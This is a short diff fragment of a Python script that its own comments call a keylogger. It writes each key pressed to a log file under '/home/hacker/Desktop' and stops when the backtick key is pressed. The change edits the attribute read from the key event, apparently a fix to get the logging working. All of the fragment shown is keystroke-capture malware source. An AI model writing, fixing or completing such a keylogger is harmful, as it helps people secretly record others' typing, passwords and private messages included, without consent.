@@ -6,7 +6,7 @@ logfile = '/home/hacker/Desktop/file.log'
 #function to write the key pressed in a file
 def onkeypress(event):
     file = open(logfile,'a')
-    file.write(event.key)
+    file.write(event.Key)
     file.write('\n')
 
 #if '`' key is pressed then the keylogger will exit
